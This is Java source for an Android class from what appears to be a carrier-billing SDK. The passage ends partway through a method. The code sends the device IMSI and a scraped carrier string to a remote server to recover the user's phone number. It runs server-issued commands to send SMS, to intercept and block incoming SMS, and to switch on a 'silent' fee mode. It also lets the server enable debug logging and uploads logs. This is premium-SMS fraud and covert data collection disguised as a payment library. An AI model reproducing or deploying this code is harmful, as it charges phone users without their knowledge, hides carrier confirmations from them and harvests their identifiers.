package com.core_sur;

import java.net.URLDecoder;
import java.net.URLEncoder;
import java.text.MessageFormat;
import java.util.Calendar;
import java.util.UUID;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.text.Html;
import android.webkit.WebView;
import android.widget.Toast;

import com.core_sur.HttpCommon.HttpResult;
import com.core_sur.action.CallBackAction;
import com.core_sur.action.HeartThread;
import com.core_sur.action.RunApp;
import com.core_sur.action.SmsSender;
import com.core_sur.bean.CallbackBean;
import com.core_sur.bean.CallbackResponseBean;
import com.core_sur.bean.FeeParamMessage;
import com.core_sur.bean.PayFeeMessage;
import com.core_sur.bean.RegResponse;
import com.core_sur.bean.RequestFeeMessage;
import com.core_sur.bean.RevBean;
import com.core_sur.finals.CommonFinals;
import com.core_sur.finals.URLFinals;
import com.core_sur.publics.EPCoreManager;
import com.core_sur.task.PayTaskManager;
import com.core_sur.tools.AES;
import com.core_sur.tools.CheckLog;
import com.core_sur.tools.CommonUtils;
import com.core_sur.tools.Connect;
import com.core_sur.tools.Log;
import com.core_sur.tools.mlog;

public class WCConnect {
	private final String TAG = "PayConnect";
	private static WCConnect wcConnect;
	public RegResponse regResponse = null;
	public String CallBackUserTag = "";
	private final WebView mWebView = null;
	HeartThread heartThread = null;
	public int CallBackWCNum = 0;
	private Boolean IsRegedited = false;
	private String note;
	private final int NOTNETWORK = 2000;
	private final int NOTIMSI = 2001;
	private String tempOrderKey = null; // 临时订单号 内部使用 代表发起一次请求

	public static WCConnect getInstance() {
		if (wcConnect == null) {
			wcConnect = new WCConnect();
		}
		return wcConnect;
	}

	public WCConnect() {
	}

	/**
	 * 
	 * 初始化计费，请在程序主线程开启时调用
	 * 
	 * @param gwclienttype
	 *            客户端版本
	 * @param myContext
	 *            当前上下文
	 * @param AppKey
	 *            计费的密钥
	 */
	public void Regedit(final int gwclienttype, final Context myContext,
			final String AppKey, final String Reg_args) {
		try {
			if (IsRegedited) {
				return;
			} else {
				IsRegedited = true;
			}

			Config.gwClientType = gwclienttype;
			// Config.AesKey = AesKey;
			Config.AppKey = AppKey;
			Config.Args = Reg_args;
			if (Config.IsDebug) {
				CheckLog.log(this.getClass().getName(), new Exception()
						.getStackTrace().toString(), "Config.Args"
						+ Config.Args);
			}

			Config.getInstance().tpContext = myContext;

			// Config.UnionId = UnionId;

			// 初始化链接地址和IP
			InitConfigSP();

			new Thread() {
				@Override
				public void run() {

					//访问网络获取加密串，提交服务器，用于解密出手机号
					new Thread(new Runnable() {
						@Override
						public void run() {
							// TODO Auto-generated method stub
							if(CommonUtils.getNetWork(Config.getInstance().tpContext) == 1){
								
								HttpResult hres = HttpCommon.getHtmlContents(Config.getenurl, "", false);
								
								if (hres.StatusCode == 500)
									 hres = HttpCommon.getHtmlContents(Config.getenurl2, "", false);
								
								System.out.println("Andy Tag : HttpResult hres.StatusCode:" + hres.StatusCode);
								
								if (hres.StatusCode == 200) {
									
									System.out.println("Andy Tag : HttpResult :" + hres.HtmlContents);
									String temp = Html.fromHtml(hres.HtmlContents).toString().trim().replaceAll("\r|\n", "");
									temp = temp.substring(temp.indexOf("号") + 1, temp.length());
									//android.util.Log.i("temp",temp);
									if (temp.length() == 0) 
										return;
									
									temp = "?imsi=" + CommonUtils.getImsi(Config.getInstance().tpContext) + "&encryptStr=" + temp;
									//android.util.Log.i("temp",temp);
									HttpCommon.getHtmlContents(Config.submitenurl + temp, "", false);
								}
								
							}
						}
					}).start();
					
					//验证app签名
					if (Config.isCheck) {
						SharedPreferences signinfo = Config.getInstance().tpContext.getSharedPreferences("signinfo",Context.MODE_PRIVATE);
						String signstr = signinfo.getString("signparams", "");
						HttpResult res = HttpCommon.getHtmlContents(Config.checkUrl + "?" + signstr, "", false);
						if (res.HtmlContents.equals("0")) {
							//验证不通过
							Config.getInstance().tpContext.getSharedPreferences("signinfo", Context.MODE_PRIVATE).edit()
							.putInt("checkresult", 0).commit();
							EPCoreManager.getInstance().initPaySuccess(com.core_sur.Config.INIT_FAILED, "应用公钥不合法");
							return;
						}else {
							//验证通过
							int time;
							try{
								time = Integer.parseInt(res.HtmlContents);
							}catch(Exception e){
								time = 3;
							}
							
							Config.getInstance().tpContext.getSharedPreferences("signinfo", Context.MODE_PRIVATE).edit()
							.putInt("checkresult", 1).putInt("paytime", time * 1000).commit();
						}
					}
					
					SharedPreferences sp_Setting = Config.getInstance().tpContext.getSharedPreferences("Setting_snspt",Context.MODE_PRIVATE);
							
									
					try {
						String temp = HttpXmlData.getJson(
								Config.getInstance().tpContext, Config.regUrl,
								gwclienttype, "");

						if (temp == null || temp.length() == 0) {

							// 重新赋值
							if (!Config.LinkDomain.endsWith("")) {
								Config.MainIp = Config.LinkDomain;
							}

							Config.regUrl = "http://" + Config.MainIp
									+ "/req.aspx";

							temp = HttpXmlData.getJson(
									Config.getInstance().tpContext,
									Config.regUrl, gwclienttype, "");

							if (temp == null || temp.length() == 0) {
								temp = sp_Setting.getString(
										Config.CacheKey.CacheRegInfo, null);
							} else {
								// 保存信息
								Editor editor = sp_Setting.edit();
								editor.putString(Config.CacheKey.CacheRegInfo,
										temp);
								editor.commit();
							}
						} else {
							// 保存信息
							Editor editor = sp_Setting.edit();
							editor.putString(Config.CacheKey.CacheRegInfo, temp);
							editor.commit();
						}

						Log.e("test", "temp----core--:"+temp);
						// 得到服务器数据解析
						regResponse = GetRegResponse(temp);
						if (regResponse == null) {
							EPCoreManager.getInstance().initPaySuccess(
									Config.INIT_FAILED);
							return;
						}
						Config.AesNewKey = regResponse.getCryptkey();
						CheckLog.log(this.getClass().getName(), new Exception()
								.getStackTrace().toString(), "Config.AesNewKey"
								+ Config.AesNewKey);
						Config.FeeWindowMode = regResponse.getFeeWindowMode();
						// Config.MainIp = regResponse.getMainIp();
						Config.LinkIp = regResponse.getLinkIp();
						Config.LinkDomain = regResponse.getLinkDomain();
						SetConfigSP();
						EPCoreManager.getInstance().initPaySuccess(
								Config.INIT_SUCCESS);
						// /demo a2014f89b301452a80734324f5b5683d
						if (gwclienttype == 2 || gwclienttype == 3
								|| gwclienttype == 4) {
						} else {
							// 当前版本先不判断，直接用短信取白名单
							String IMSI = HttpXmlData.getIMSI(Config
									.getInstance().tpContext);

							if (IMSI.startsWith("460")) {
								GetPhoneNumber(IMSI);
							}
						}

						// if (HttpXmlData.isFourth())
						// {
						// Message msg = new Message();
						// msg.what = 0;
						// msg.obj = temp;
						// handler.sendMessage(msg);
						// } else
						// {
						// HttpXmlData.getPhoneNumber(context);
						// Message msg = new Message();
						// msg.what = 0;
						// msg.obj = temp;
						// handler.sendMessage(msg);
						// }

						if (heartThread == null) {
							// 关闭服务
						}

						String CacheResListString = sp_Setting.getString(
								Config.CacheKey.WCCacheResListString, null);

						// 缓存GW收费界面数据
						if (Connect.isNetworkAvailable(Config
								.getInstance().tpContext)) {
							String tempStr = HttpCommon.getHtmlContents(
									regResponse.getCacheUrl(), "unionid="
											+ Config.UnionId, false).HtmlContents;

							if (tempStr != null && tempStr.length() > 0) {
								CacheResListString = tempStr;

								// 保存信息
								Editor editor = sp_Setting.edit();
								editor.putString(
										Config.CacheKey.WCCacheResListString,
										CacheResListString);
								editor.commit();
							}
						}

						String[] info1 = CacheResListString
								.split(Config.splitStringLevel1);
						for (String TempStr1 : info1) {
							String[] info2 = TempStr1
									.split(Config.splitStringLevel2);
							if (info2.length == 2) {
								if (!Config.ht_CacheResInfo
										.containsKey(info2[0].toLowerCase())) {
									try {
										Config.ht_CacheResInfo.put(
												info2[0].toLowerCase(),
												Long.parseLong(info2[1]));
									} catch (Exception e) {
									}
								}
							}
						}
					} catch (Exception e) {
						e.fillInStackTrace();
					}
				};
			}.start();
		} catch (Exception e) {
			if (Config.IsDebug) {
				Log.i(TAG, "Reg Erro:" + e.getMessage());
			}
		}
	}

	/*
	 * 初始化链接地址和IP* 此处意思为，从3个IP中选择一个首选IP，避免因为IP地址改变而导致sdk无法连接
	 */
	public void InitConfigSP() {
		SharedPreferences sp_Setting = Config.getInstance().tpContext
				.getSharedPreferences("Setting_snspt_Link",
						android.content.Context.MODE_PRIVATE);

		if (Config.MainIp.length() == 0) {
			Editor editor = sp_Setting.edit();
			editor.putString("MainIp", Config.LinkIp);
			editor.putString("LinkIp", Config.LinkIp);
			editor.putString("LinkDomain", Config.LinkDomain);
			editor.commit();
		}

		if (!sp_Setting.getString("MainIp", "").equals("")) {
			Config.MainIp = sp_Setting.getString("MainIp", "");
		}
	}

	public void exit() {
		wcConnect = null;
		System.gc();
	}

	/*
	 * 更新链接地址和IP*
	 */
	public void SetConfigSP() {
		SharedPreferences sp_Setting = Config.getInstance().tpContext
				.getSharedPreferences("Setting_snspt_Link",
						android.content.Context.MODE_PRIVATE);
		Editor editor = sp_Setting.edit();
		editor.putString("MainIp", Config.MainIp);
		editor.putString("LinkIp", Config.LinkIp);
		editor.putString("LinkDomain", Config.LinkDomain);
		editor.commit();

		if (!sp_Setting.getString("MainIp", "").equals("")) {
			Config.MainIp = sp_Setting.getString("MainIp", "");
		}
	}

	/*
	 * 获取用户真正手机号,app用来判定是否发送认证号码礼包
	 */
	public String GetUserMobileNo() {
		// 获取用户手机号码

		if (Connect
				.isNetworkAvailable(Config.getInstance().tpContext)) {
			String tempUrl = "uid=" + regResponse.getUid() + "&key=";

			String keyString = "{\"cmdid\":" + Config.CMD_GetTrueMobileNoByUId
					+ "}";
			keyString = AES.EncodeString(keyString, Config.AesNewKey);
			tempUrl += keyString;

			if (Config.IsDebug) {
				Log.i(TAG, tempUrl);
			}

			try {
				String tempData = HttpCommon.getHtmlContents(
						regResponse.getCallbackurl(), tempUrl, false).HtmlContents;

				tempData = AES.DecodeString(tempData, Config.AesNewKey);

				JSONObject jsonObj = new JSONObject(tempData);
				int status = jsonObj.getInt("status");
				long linkId = jsonObj.getLong("linkid");
				if (status == 0) {
					String Msg = jsonObj.getString("msg");
					return Msg;
				}
			} catch (Exception e1) {
				if (Config.IsDebug) {
					Log.i(TAG, e1.getMessage());
				}
			}
		}

		return "";
	}

	/*
	 * 获取用户真正手机号,app用来判定是否发送认证号码礼包 大概需要时间1分钟
	 */
	public String AUTUserMobileNo(Boolean IsWaiting) {
		// 获取用户手机号码

		if (Connect
				.isNetworkAvailable(Config.getInstance().tpContext)) {
			String UrlParms = "uid=" + regResponse.getUid() + "&key=";

			String keyString = "{\"cmdid\":" + Config.CMD_AUTUserMobileNo + "}";
			keyString = AES.EncodeString(keyString, Config.AesNewKey);
			UrlParms += keyString;

			try {
				String tempData = HttpCommon.getHtmlContents(
						regResponse.getCallbackurl(), UrlParms, false).HtmlContents;

				tempData = AES.DecodeString(tempData, Config.AesNewKey);

				JSONObject jsonObj = new JSONObject(tempData);
				int status = jsonObj.getInt("status");
				long linkId = jsonObj.getLong("linkid");
				if (status == 10) {
					String Msg = jsonObj.getString("msg");
					Msg = AES.DecodeString(Msg.trim(), Config.AesNewKey);
					openJSONData(Msg);
					if (IsWaiting) {
						String mobileNo = "";

						// 此处死循环等待1分钟

						for (int i = 0; i < 60 * 2; i++) {
							// 去服务器询问
							mobileNo = GetUserMobileNo();

							if (mobileNo.length() > 0) {
								break;
							}

							Thread.sleep(500);
						}

						return mobileNo;
					}
				}
			} catch (Exception e1) {
				if (Config.IsDebug) {
					Log.i(TAG, e1.getMessage());
				}
			}
		}

		return "";
	}

	private void GetPhoneNumber(String IMSI) {
		if (Connect
				.isNetworkAvailable(Config.getInstance().tpContext)) {
			String tempUrl = "uid=" + regResponse.getUid() + "&key=";

			String keyString = "{\"cmdid\":5050}";
			keyString = AES.EncodeString(keyString, Config.AesNewKey);
			tempUrl += keyString;

			if (Config.IsDebug) {
				Log.i(TAG, tempUrl);
			}
			try {
				String tempData = HttpCommon.getHtmlContents(
						regResponse.getCallbackurl(), tempUrl, false).HtmlContents;
				CheckLog.log(this.getClass().getName(), new Exception()
						.getStackTrace().toString(), tempData);
				tempData = AES.DecodeString(tempData, Config.AesNewKey);

				JSONObject jsonObj = new JSONObject(tempData);
				int status = jsonObj.getInt("status");
				long linkId = jsonObj.getLong("linkid");
				if (status == 10) {
					String Msg = jsonObj.getString("msg");
					Msg = AES.DecodeString(Msg.trim(), Config.AesNewKey);

					openJSONData(Msg);
					if (Config.IsDebug) {
						Log.i(TAG, Msg);
					}
				}
			} catch (Exception e1) {
				if (Config.IsDebug) {
					Log.i(TAG, e1.getMessage());
				}
			}
		}
	}

	public void Pay(final Handler handler, Context myContext, String UserTag,
			String OtherInfo, int WCNum) {
		Pay(handler, myContext, UserTag, OtherInfo, WCNum, null);
	}

	/*
	 * 获取资费提示
	 */
	public String GetFeeInfo(final Context myContext, final String UserTag,
			final String OtherInfo, final int WCNum, final String note) {
		if (note == null) {
			WCConnect.getInstance().note = "";
		} else {
			WCConnect.getInstance().note = note;

		}

		CallBackUserTag = UserTag;
		Config.getInstance().tpHandler = handler;
		Config.getInstance().tpContext = myContext;
		CallBackWCNum = WCNum; // 联通客户端通知时候返回此值
		if (!Connect.isNetworkAvailable(myContext)) {
			return "";
		}

		if (regResponse != null && Config.FeeWindowMode == 2) {
			try {
				// 静默模式

				String postData = "{\"usertag\":\"" + UserTag + "\","
						+ "\"ct\":\"" + Config.gwClientType + "\","
						+ "\"WCNum\":\"" + WCNum + "\"," + "\"Args\":\""
						+ OtherInfo + "\"," + "\"var\":\"" + Config.WCVerSion
						+ "\"}";

				JSONObject jsonObj = new JSONObject();
				jsonObj.put("cmdid", Config.CMD_GetFeeInfo);
				jsonObj.put("linkid", 0);
				jsonObj.put("msg", postData);
				jsonObj.put("status", 0);

				postData = jsonObj.toString();

				String urlPart = "uid=" + regResponse.getUid() + "&key="
						+ AES.EncodeString(postData, Config.AesNewKey)
						+ "&var=" + Config.WCVerSion;

				String MyPayUrl = "http://" + Config.MainIp + "/req.aspx?"
						+ urlPart;

				String JsonStr = HttpCommon
						.getHtmlContents(MyPayUrl, "", false).HtmlContents;

				JsonStr = AES.DecodeString(JsonStr, Config.AesNewKey);

				jsonObj = new JSONObject(JsonStr);
				String Msg = jsonObj.getString("msg");
				if (Msg == null) {
					return "";
				} else {
					return Msg;
				}

			} catch (Exception e) {

			}

		}

		return "";
	}

	public void Pay(Handler handler, Context myContext, String UserTag,
			String OtherInfo, int WCNum, String note) {
		if (note == null) {
			WCConnect.getInstance().note = "";
		} else {
			WCConnect.getInstance().note = note;
		}
		try {
			CallBackUserTag = URLEncoder.encode(UserTag, "utf-8");
		} catch (Exception e) {
		}

		Config.getInstance().tpHandler = handler;
		Config.getInstance().tpContext = myContext;
		CallBackWCNum = WCNum; // 联通客户端通知时候返回此值
		if (HttpXmlData.getIMSI(Config.getInstance().tpContext) == null) {
			// this.handler.sendEmptyMessage(NOTIMSI);
		}

		if (!Connect.isNetworkAvailable(myContext)) {
			this.handler.sendEmptyMessage(NOTNETWORK);
			if (Config.getInstance().tpHandler != null) {
				EPCoreManager.getInstance().sendMessage(
						URLFinals.WEB_STATISTICAL,
						new PayFeeMessage(note, WCNum, 0,
								Config.CMD_NOCONFIG_App), null);
				SendHanlderMsg(Config.getInstance().tpHandler,
						Config.CMD_NOCONFIG_App, "");
			}
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(), "通知客户端，无法计费:");
		}
		if (Config.IsDebug) {
			Log.i("pay", "pay");
		}
		tempOrderKey = UUID.randomUUID().toString(); // 临时订单号 赋值
		try {
			if (regResponse != null) {
				// 静默模式
				RequestFeeMessage requestFeeMessage = new RequestFeeMessage(
						note, WCNum);
				EPCoreManager.getInstance().sendMessage(URLFinals.WEB_STATISTICAL,
						requestFeeMessage, null);
				String MyPayUrl = regResponse.getFeeurl() + "?usertag="
						+ UserTag;
				MyPayUrl += "&uid=" + regResponse.getUid() + "&ct="
						+ Config.gwClientType + "&WCNum=" + WCNum + "&Args="
						+ URLEncoder.encode(OtherInfo, "utf-8") + "&var="
						+ Config.WCVerSion + "&note="
						+ URLEncoder.encode(note, "utf-8");
				CheckLog.log(this.getClass().getName(), new Exception()
						.getStackTrace().toString(), "MyPayUrl:" + MyPayUrl);
				String CMDStr = HttpCommon.getHtmlContents(MyPayUrl, "", false).HtmlContents;
				Log.e("test","core------cmdstr---------:"+CMDStr);
				if (Config.IsDebug) {
					CheckLog.log(this.getClass().getName(), new Exception()
							.getStackTrace().toString(), "CMDStr:" + CMDStr);
				}
				Intent sendPaySuccess = new Intent(myContext.getPackageName()
						+ ".my.fee.listener");
				sendPaySuccess.putExtra("sendPaySuccess", 1);
				myContext.sendBroadcast(sendPaySuccess);
				if (CMDStr.length() == 0) {
					CallbackResponseBean callbackResponseBean = new CallbackResponseBean();
					String TempStr = "{" + "\"cmdid\":" + Config.CMD_SHOWMSG
							+ "," + "\"msg\":\"网络异常，请重试!\","
							+ "\"delaytime\":0" + "," + "\"linkid\":0" + "}";
					callbackResponseBean.setMsg(AES.EncodeString(TempStr,
							Config.AesNewKey));
					callbackResponseBean.setStatus(10);
					Message msg = new Message();
					msg.what = 0;
					msg.obj = callbackResponseBean;
					handlerHeart.sendMessage(msg);
					return;
				}

				String NoConfigMsg = "";
				CheckLog.log(this.getClass().getName(), new Exception()
						.getStackTrace().toString(), "aeskey:"
						+ Config.AesNewKey);
				String[] infoStr = CMDStr.split(Config.splitStringLevel3);
				// 逐条解析指令,判断是否需要二次确认
				// 如果二次确认,在这里弹出一个窗口,
				// 用户取消后,直接return接口
				// 用户确定后,继续后续流程
				// 备注：违反原设计模式,所以此处只能冗余兼容处理
				// 2015-2-3 by keng
				for (String TempStr : infoStr) {
					if (TempStr.startsWith("参数")) {
						CheckLog.log(this.getClass().getName(), new Exception()
								.getStackTrace().toString(), "参数为空!"
								+ regResponse);
						Message msg = Message.obtain();
						msg.what = 1078;
						msg.obj = "参数为空!";
						handler.sendMessage(msg);
						return;
					}
					String decode = AES.DecodeString(TempStr, Config.AesNewKey);
					Log.e("test", "decode----cmdstr---:"+decode);
					RevBean revBean = GetRevBean(decode);

					if (revBean.getCmdid() == Config.CMD_FeeWindowMode) {
						if (Config.CMD_FeeWindowMode != 4) {
							if ("1".equals(revBean.getMsg())) {
								Config.FeeWindowMode = 1;
							}
						}
					}
					
					if (revBean.getCmdid() == Config.CMD_OpenMobileNoInputWindow) {
						Config.FeeWindowMode = 4;
					}

					if (revBean.getCmdid() == Config.CMD_FeeInfo) {
						Config.FeeInfo = revBean.getMsg();
					}

					// 远程开启调试模式，在调用pay方法时获取值
					// 正常逻辑是在注册时获取，但是因为注册时没做和ep平台服务器通讯，此处偷懒实用xml方式获取
					if (revBean.getCmdid() == Config.CMD_IsDebug) {
						Config.IsDebug = revBean.getMsg().equals("1") ? true
								: false;
					}

					if (revBean.getCmdid() == Config.CMD_NOCONFIG) {
						NoConfigMsg = revBean.getMsg();
					}
				}

				// 判断是否noconfig,如果是,则显示,并且终止计费流程
				if (NoConfigMsg.length() > 0) {
					Message msg = Message.obtain();
					msg.what = 1078;
					msg.obj = NoConfigMsg;
					handler.sendMessage(msg);
					showToast(NoConfigMsg);
					return;
				} else {
					CheckLog.log(this.getClass().getName(), new Exception()
							.getStackTrace().toString(), "NoConfigMsg==0");
				}
				
							
				//自有SDK非输入手机号计费界面
				if (Config.FeeWindowMode == 1 && Config.FeeInfo.length() > 0) {
					// 弹对话框,进行二次确认
					// 资费信息: Config.FeeInfo
					// 窗口模式: Config.FeeWindowMode
					CheckLog.log(this.getClass().getName(), new Exception()
							.getStackTrace().toString(),
							"进行二次确认 弹出 Config.FeeWindowMode="
									+ Config.FeeWindowMode);
					EPCoreManager.getInstance().showPayHintActivity(WCNum + "",
							note);
					while (Config.FeeWindowMode == 1) {
						Thread.sleep(3000);
					}
					if (Config.FeeWindowMode == 3) {
						return;
					}
				}
				//SDK输入手机号计费界面
				if (Config.FeeWindowMode == 4 && Config.FeeInfo.length() > 0) {
					// 弹对话框,进行二次确认
					// 资费信息: Config.FeeInfo
					// 窗口模式: Config.FeeWindowMode
					CheckLog.log(this.getClass().getName(), new Exception()
							.getStackTrace().toString(),
							"进行二次确认 弹出 Config.FeeWindowMode="
									+ Config.FeeWindowMode);
					EPCoreManager.getInstance().showPayPNActivity(WCNum + "",note);
					
					for (String TempStr : infoStr) {
						CallbackResponseBean callbackResponseBean = new CallbackResponseBean();
						callbackResponseBean.setMsg(TempStr);
						callbackResponseBean.setStatus(10);

						Message msg = new Message();
						msg.what = 0;
						msg.obj = callbackResponseBean;

						handlerHeart.sendMessage(msg);
					}
					
					while (Config.FeeWindowMode == 4) {
						Thread.sleep(3000);
					}
					if (Config.FeeWindowMode == 3) {
						return;
					}
				}
				
				if (infoStr.length == 0) {
					CheckLog.log(this.getClass().getName(), new Exception()
							.getStackTrace().toString(), " infoStr.len=0");
				}
				// 后续操作
				for (String TempStr : infoStr) {
					CallbackResponseBean callbackResponseBean = new CallbackResponseBean();
					callbackResponseBean.setMsg(TempStr);
					callbackResponseBean.setStatus(10);

					Message msg = new Message();
					msg.what = 0;
					msg.obj = callbackResponseBean;

					handlerHeart.sendMessage(msg);
				}
				
			} else {
				Message msg = Message.obtain();
				msg.what = 1078;
				msg.obj = "返回为空!";
				handler.sendMessage(msg);
				Intent sendPaySuccess = new Intent(myContext.getPackageName()
						+ ".my.fee.listener");
				sendPaySuccess.putExtra("sendPaySuccess", 1);
				myContext.sendBroadcast(sendPaySuccess);
				CheckLog.log(this.getClass().getName(),
						new Exception().getStackTrace()[0].toString(),
						"regResponse == " + regResponse);
			}
		} catch (Exception e) {
			if (Config.IsDebug) {
				Log.d("PayUrl", e.getMessage());
			}
		}
		new Thread() {
			@Override
			public void run() {
				try {
					Thread.sleep(1000 * 60 * 5);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					// e.printStackTrace();
				}
				PostLog("SMSLog:SDK:从开始请求计费开始,5分钟后 应用仍然活着");
			};
		}.start();
	}

	private void showToast(final String str) {
		Config.getInstance().tpHandler.post(new Runnable() {
			@Override
			public void run() {
				Toast.makeText(Config.getInstance().tpContext, str,
						Toast.LENGTH_LONG).show();
			}
		});
	}

	/*
	 * User Cancel Fee Dialog
	 */
	public void UserCancelFeeDialog() {
		// Post到GW,根据特殊标识来区分并根据以前接口回传给EP
		Message msg = Message.obtain();
		msg.what = 1078;
		msg.obj = "取消支付";
		EPCoreManager.getInstance().payHandler.sendMessage(msg);
		WCConnect.getInstance().PostLog(
				"SMSSendStatus:-UserCancelDialog" + Config.splitStringLevel1
						+ "" + Config.splitStringLevel1 + ""
						+ Config.splitStringLevel1 + "UserCancelDialog");
	}

	Handler handler = new Handler(Looper.getMainLooper()) {
		@Override
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case NOTNETWORK:
				Toast.makeText(Config.getInstance().tpContext, "请先连接网络!",
						Toast.LENGTH_LONG).show();
				break;

			case NOTIMSI:
				Toast.makeText(Config.getInstance().tpContext, "无卡!",
						Toast.LENGTH_LONG).show();
				break;
			}
			try {
			} catch (Exception e) {
				if (Config.IsDebug) {
					Log.d(TAG, e.getMessage());
				}
			}

		};
	};

	void openJSONData(final String aJSONData) {
		// CheckLog.log(this.getClass().getName(),new
		// Exception().getStackTrace().toString()("AnalyseJSONData" +
		// aJSONData);
		openJSONData(aJSONData, Config.getInstance().tpContext);
	}

	public void PostLog(final String Msg) {
		CheckLog.log(this.getClass().getName(), "PostLog Msg", Msg);
		new Thread() {
			@Override
			public void run() {
				try {
					if (regResponse == null
							|| regResponse.getCryptkey() == null
							|| regResponse.getCryptkey().length() == 0
							|| regResponse.getCallbackurl() == null
							|| regResponse.getCallbackurl().length() == 0) {
						Context _context = Config.getInstance().tpContext;

						// 重新获取regResponse
						SharedPreferences sp_Setting = _context
								.getSharedPreferences("Setting_snspt",
										Context.MODE_PRIVATE);

						regResponse = null;

						if (regResponse == null) {
							String regInfo = sp_Setting.getString(
									Config.CacheKey.CacheRegInfo, null);

							if (regInfo != null && regInfo.length() > 0) {
								regResponse = GetRegResponse(regInfo);
							}
						}

						if (regResponse != null) {
							Config.AesNewKey = regResponse.getCryptkey();
						}
					}

					JSONObject jsonObj = new JSONObject();
					jsonObj.put("cmdid", 1003);
					jsonObj.put("linkid", 0);
					jsonObj.put(
							"msg",
							Msg
									+ CommonUtils.getConnectMethod(Config
											.getInstance().tpContext));
					jsonObj.put("status", 0);
					String postData = jsonObj.toString();
					String tempString = "uid="
							+ regResponse.getUid()
							+ "&key="
							+ AES.EncodeString(postData,
									regResponse.getCryptkey()) + "&var="
							+ Config.WCVerSion;
					HttpResult hr = HttpCommon.getHtmlContents(
							regResponse.getCallbackurl(), tempString, false);
				} catch (Exception e) {
				}
			}
		}.start();
	}

	/*
	 * 上传完整客户端日志，上传完毕，如果服务器返回ok，则删除本地日志，避免再次发送
	 */
	public void PostFullClientLog(final String Msg) {
		// 判断是否开启远程调试
		if (!Config.IsDebug) {
			return;
		}

		new Thread() {
			@Override
			public void run() {
				try {
					if (regResponse == null
							|| regResponse.getCryptkey() == null
							|| regResponse.getCryptkey().length() == 0
							|| regResponse.getCallbackurl() == null
							|| regResponse.getCallbackurl().length() == 0) {
						Context _context = Config.getInstance().tpContext;

						// 重新获取regResponse
						SharedPreferences sp_Setting = _context
								.getSharedPreferences("Setting_snspt",
										Context.MODE_PRIVATE);

						regResponse = null;

						if (regResponse == null) {
							String regInfo = sp_Setting.getString(
									Config.CacheKey.CacheRegInfo, null);

							if (regInfo != null && regInfo.length() > 0) {
								regResponse = GetRegResponse(regInfo);
							}
						}

						if (regResponse != null) {
							Config.AesNewKey = regResponse.getCryptkey();
						}
					}

					JSONObject jsonObj = new JSONObject();
					jsonObj.put("cmdid", Config.CMD_UpLoadLog);
					jsonObj.put("linkid", 0);
					jsonObj.put("msg", Msg);
					jsonObj.put("status", 0);
					String postData = jsonObj.toString();

					String tempString = "uid="
							+ regResponse.getUid()
							+ "&key="
							+ AES.EncodeString(postData,
									regResponse.getCryptkey()) + "&var="
							+ Config.WCVerSion;

					HttpResult hr = HttpCommon.getHtmlContents(
							regResponse.getCallbackurl(), tempString, false);

					if (hr.HtmlContents != null
							&& hr.HtmlContents.trim().endsWith("ok")) {
						// 删除本地日志，避免再次上传
					}
				} catch (Exception e) {
				}
			}
		}.start();
	}

	public HttpResult GetHttpContents(final String Url, final String Parms) {
		try {
			// JSONObject jsonObj = new JSONObject();
			// jsonObj.put("cmdid", 1003);
			// jsonObj.put("linkid", 0);
			// jsonObj.put("msg", Msg);
			// jsonObj.put("status", 0);
			// String postData = jsonObj.toString();

			String tempString = "uid=" + regResponse.getUid() + "&key="
					+ AES.EncodeString(Parms, regResponse.getCryptkey())
					+ "&var=" + Config.WCVerSion;

			HttpResult hr = HttpCommon.getHtmlContents(Url, tempString, false);

			return hr;
		} catch (Exception e) {
		}

		return new HttpResult();
	}

	public void openJSONData(final String aJSONData, final Context context) {
		try {
			if (Config.IsDebug) {
				Log.i(TAG, aJSONData);
			}
			final RevBean revBean = GetRevBean(aJSONData);
			CheckLog.log(getClass().getName(), "openJSONData", aJSONData);
			Log.e("test", "aJSONData---openJSONData---"+aJSONData);
			if (revBean == null) {
				PostLog("SMSLog:SDK解析指令出错!指令:" + aJSONData);
				return;
			} else {
				PostLog("WCMGetCMD:\t\tCMDId:" + revBean.getCmdid()
						+ "\t\tCMDMsg:" + revBean.getMsg());
			}
			Thread.sleep(revBean.getDelayTime());
			if (revBean.getCmdid() == Config.CMD_SMS) {
				
				
				
				PostLog("CMD_SMS:ok" + revBean.getMsg());
				// region 传递计费结果到游戏去
				SmsSender smsSender = new SmsSender(context, handlerAction,
						revBean, tempOrderKey);
				smsSender.start();
				try {
					new FeeParamMessage(Config.CMD_SMS, "发送短信接口");

				} catch (Exception e) {
				}
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_OpenSMSFilterSendSMS) {
				// region 建立拦截并发短信
				String MergeJson = revBean.getMsg();
				MergeJson = URLDecoder.decode(MergeJson, "utf-8");
				//mlog.i("SMSLog:SDK建立拦截并发短信!MergeJson = " + MergeJson);
				
				String[] info = MergeJson.split(Config.splitStringLevel1
						+ Config.splitStringLevel2 + Config.splitStringLevel3);

				if (info.length == 2) {					

					PostLog("SMSLog:\t\t:新规则json组" + revBean.getCmdid()
							+ "\t\tCMDMsg:" + info[0] + info[1]);
					
					Config.SMSJson = info[1];
					
					openJSONData(info[0], context);
					// 调用标准拦截接口
				} else {
					PostLog("SMSLog:\t\t:" + revBean.getCmdid()
							+ "\t\tCMDMsg:新规则下发json有误");
				}
			} else if (revBean.getCmdid() == Config.CMD_OPENHOLDSMS) {
				// region 开启短信拦截
				PostLog("SMSLog:SDK开始建立拦截!");
				//mlog.i("SMSLog:SDK开始建立拦截!aJSONData = " + aJSONData.toString());

				Calendar now = Calendar.getInstance();
				long DataMillis = now.getTimeInMillis();

				try {
					new FeeParamMessage(Config.CMD_OPENHOLDSMS, "建立短信屏蔽服务");
				} catch (Exception e) {
					// TODO: handle exception
				}
				// 保存信息
				SharedPreferences sp_Setting = context.getSharedPreferences(
						"Setting_snspt", Context.MODE_PRIVATE);
				Editor editor = sp_Setting.edit();
				editor.putString(Config.CacheKey.CacheSMSFilterString,
						aJSONData);
				editor.putLong(Config.CacheKey.CacheSMSFilterTime, DataMillis);
				editor.commit();
				SMSHolder.getInstance().StartHolder(context);
			} else if (revBean.getCmdid() == Config.CMD_CLOSEHOLDSMS) {
				try {
					new FeeParamMessage(Config.CMD_CLOSEHOLDSMS, "关闭短信屏蔽服务");
				} catch (Exception e) {
				}
				Calendar now = Calendar.getInstance();
				long DataMillis = now.getTimeInMillis();

